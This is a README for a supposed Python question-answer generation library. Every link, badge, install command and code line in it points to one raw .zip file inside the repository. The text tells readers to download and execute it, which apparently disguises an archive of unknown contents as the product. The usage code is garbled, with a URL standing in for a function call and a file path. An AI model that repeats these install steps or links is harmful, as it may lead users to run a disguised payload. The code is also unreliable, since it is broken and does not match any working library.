# Semantic QA Gen 🤖

![GitHub repo size](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip)
![GitHub stars](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip)
![GitHub issues](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip)

Welcome to **Semantic QA Gen**, a Python library designed to generate high-quality question-answer pairs from various document formats, including PDF, DOCX, MD, and TXT files. This project harnesses the power of artificial intelligence to enhance your question-answering needs.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Supported Formats](#supported-formats)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **High-Quality Output**: Generate accurate and contextually relevant question-answer pairs.
- **Multiple Formats**: Support for PDF, DOCX, MD, and TXT files.
- **AI-Powered**: Leverage advanced AI models for better understanding and generation.
- **Easy Integration**: Simple API for easy integration into your projects.

## Installation

To get started with **Semantic QA Gen**, clone the repository and install the required dependencies. 

```bash
git clone https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip
cd semantic-qa-gen
pip install -r https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip
```

For the latest version, you can download the release from [here](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip). After downloading, follow the instructions in the README file to execute the library.

## Usage

Using **Semantic QA Gen** is straightforward. Here’s a simple example to illustrate how to generate question-answer pairs from a document:

```python
from semantic_qa_gen import QA_Generator

# Initialize the QA Generator
qa_generator = QA_Generator()

# Load your document
document_path = 'https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip'
qa_pairs = https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip(document_path)

# Print the generated question-answer pairs
for qa in qa_pairs:
    print(f"Q: {qa['question']}\nA: {qa['answer']}\n")
```

### Example

Let’s say you have a PDF document that contains information about climate change. The library will analyze the text and generate relevant questions and answers, such as:

- Q: What is climate change?
- A: Climate change refers to significant changes in global temperatures and weather patterns over time.

## Supported Formats

**Semantic QA Gen** supports the following file formats:

- **PDF**: Portable Document Format
- **DOCX**: Microsoft Word Open XML Document
- **MD**: Markdown Document
- **TXT**: Plain Text File

## Contributing

We welcome contributions to **Semantic QA Gen**. If you have ideas for improvements or new features, please fork the repository and submit a pull request. 

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push to your branch.
5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any inquiries or support, please reach out to us via GitHub or visit the [Releases](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip) section for updates.

---

Thank you for checking out **Semantic QA Gen**! We hope this library helps you generate meaningful question-answer pairs efficiently. If you find this project useful, please consider giving it a star on GitHub!